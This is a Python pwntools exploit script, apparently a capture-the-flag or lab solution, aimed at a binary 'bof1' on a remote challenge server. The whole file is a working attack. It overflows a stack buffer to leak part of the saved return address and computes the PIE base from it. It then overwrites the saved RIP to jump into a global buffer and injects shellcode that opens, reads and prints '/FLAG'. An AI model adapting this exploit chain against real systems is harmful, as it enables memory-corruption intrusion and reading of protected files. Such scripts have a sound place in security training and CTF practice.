from pwn import *

# ----------------------------------------
# Setup: specify architecture and logging
# ----------------------------------------

# We’re targeting a 64-bit binary
context.arch = 'amd64'
# Turn on debug-level logging to see what's happening under the hood
context.log_level = 'debug'

# Load the binary to extract symbols
elf = ELF('./bof1')
main_offset = elf.symbols['main']
# In main, the return address for task() is at main + 0xc6
task_ret_in_main = main_offset + 0xc6
# Symbol for the global 'msg' buffer, which we will eventually jump to
msg_symbol = elf.symbols['msg']

log.info(f"[+] Static offset to task return (main + 0xc6): {hex(task_ret_in_main)}")

# ----------------------------------------
# 1) Connect to target process (remote or local)
# ----------------------------------------

# If you want to test locally, uncomment the next line:
# p = process('./bof1')

# For remote exploitation:
p = remote('up.zoolab.org', 12342)

# ----------------------------------------
# 2) Leak the saved RIP (return address) from the stack
# ----------------------------------------

# We fill 56 bytes (to reach saved RBP), and then overwrite the first byte(s) of saved RIP
leak_payload = b'A' * 56
p.sendafter(b"What's your name? ", leak_payload)

# The program prints "Welcome, " before leaking our buffer + the first few bytes of RIP
p.recvuntil(b"Welcome, ", timeout=3)

# Try to read a full line; sometimes there’s no newline, so fall back to reading byte-by-byte
leaked = p.recvline(keepends=False, timeout=1)
if not leaked:
    # Fallback: read up to 8 bytes one at a time (since RIP is 8 bytes total)
    temp = b''
    for _ in range(8):
        try:
            b = p.recv(1, timeout=0.1)
            if not b:
                break
            temp += b
        except PwnlibException:
            break

    if not temp:
        # If we still got nothing, assume exactly 2 bytes of RIP after our 56 As (common small leak)
        log.warning("[!] No newline-delimited leak; trying fixed 2-byte read")
        # Here, payload + 2 bytes of RIP might have been sent without a newline
        leaked = leak_payload + p.recv(2, timeout=0.5)
    else:
        leaked = leak_payload + temp

log.debug(f"[+] Raw leak (possibly payload + partial RIP): {leaked!r}")

# Verify the leak starts with our 'A' * 56
if not leaked.startswith(leak_payload):
    log.error("[!] Leak did not start with our padding. Aborting.")
    p.close()
    exit()

# Extract just the bytes after our known padding
partial_ra = leaked[len(leak_payload):]
ra_len = len(partial_ra)
log.info(f"[+] Extracted {ra_len} byte(s) of the saved RIP: {partial_ra!r}")

if ra_len == 0:
    log.error("[!] No return address bytes leaked. Cannot continue.")
    p.close()
    exit()

# Pad the leaked bytes to 8 bytes (little-endian),
# assuming missing bytes are zero (common when printf stops at a null byte)
padded_ra = partial_ra.ljust(8, b'\x00')
full_ra = u64(padded_ra)
log.info(f"[+] Reconstructed full leaked RIP: {hex(full_ra)}")

# ----------------------------------------
# 3) Compute PIE base address
# ----------------------------------------

# The saved RIP we got corresponds to the return location inside task(), which is
# at: PIE_base + task_ret_in_main. Therefore:
pie_base = full_ra - task_ret_in_main
log.success(f"[+] Calculated PIE base: {hex(pie_base)}")

# Sanity checks on PIE base:
#  - Must be page-aligned (lowest 12 bits zero)
#  - Must be in a plausible user-space range (e.g., above 0x10000)
if (pie_base & 0xfff) != 0:
    log.error(f"[!] PIE base {hex(pie_base)} is not page-aligned. Exploit likely invalid.")
    p.close()
    exit()

if pie_base < 0x10000:
    log.error(f"[!] PIE base {hex(pie_base)} is suspiciously small. Aborting.")
    p.close()
    exit()

log.info(f"[+] PIE base {hex(pie_base)} looks good.")

# Compute the runtime address of the 'msg' buffer by adding its static offset to pie_base
msg_addr = pie_base + msg_symbol
log.success(f"[+] Computed runtime address of 'msg': {hex(msg_addr)}")

# ----------------------------------------
# 4) Progress through menu prompts to reach overwrite stage
# ----------------------------------------

# According to the binary, next prompt is "What's the room number?"
# We can send anything short here, since it isn't critical for our exploit
p.sendlineafter(b"What's the room number? ", b"skip_me")
# Consume the printed room number line
p.recvuntil(b"The room number is: ", timeout=2)
p.recvline(timeout=1)

# ----------------------------------------
# 5) Build final payload to overwrite saved RBP and saved RIP
# ----------------------------------------

# From analysis, offset from start of buf3 to saved RBP is 144 bytes
buf3_to_sfp = 144

# We choose an arbitrary fake RBP value; it won’t matter because we’re returning directly into shellcode
fake_rbp = 0xdeadbeefcafebabe

# The next 8 bytes after RBP will overwrite the saved RIP.
# We want saved RIP = address of 'msg' buffer where we’ll put our shellcode.
overwrite_payload = (
    b'B' * buf3_to_sfp         # padding to saved RBP
    + p64(fake_rbp)            # new RBP (just junk, but must be valid bytes)
    + p64(msg_addr)            # overwrite saved RIP -> jump into msg buffer
)

p.sendlineafter(b"What's the customer's name? ", overwrite_payload)
# Discard the echoed “customer name” response
p.recvuntil(b"The customer's name is: ", timeout=2)
p.recvline(timeout=1)

# ----------------------------------------
# 6) Send shellcode into the 'msg' buffer
# ----------------------------------------

shellcode_asm = """
    /* Open("/FLAG", O_RDONLY) */
    lea rdi, [rip + flag_path]
    xor rsi, rsi          /* flags = 0 */
    xor rdx, rdx          /* mode = 0 */
    mov rax, 2            /* syscall: sys_open */
    syscall

    /* Read(fd, buffer, 100) */
    mov rdi, rax          /* RDI = returned fd */
    lea rsi, [rip + file_buf]
    mov rdx, 100
    mov rax, 0            /* syscall: sys_read */
    syscall

    /* Write(1, buffer, bytes_read) */
    mov rdx, rax          /* RDX = number of bytes read */
    mov rdi, 1            /* stdout */
    lea rsi, [rip + file_buf]
    mov rax, 1            /* syscall: sys_write */
    syscall

    /* Exit(0) */
    xor rdi, rdi
    mov rax, 60           /* syscall: sys_exit */
    syscall

flag_path:
    .asciz "/FLAG"
file_buf:
    .fill 128, 1, 0       /* buffer to hold file contents */
"""

sc = asm(shellcode_asm)

# Send shellcode when prompted for "Leave your message:"
p.sendafter(b"Leave your message: ", sc)
p.recvuntil(b"Thank you!\n", timeout=2)

# ----------------------------------------
# 7) Grab the flag (if everything worked)
# ----------------------------------------

log.info("[*] Shellcode should now be running; attempting to read the flag...")
flag = p.recvall(timeout=3)
if flag:
    log.success(f"[+] FLAG: {flag.decode(errors='ignore').strip()}")
else:
    log.warning("[!] No data received. Shellcode may have failed.")

p.close()
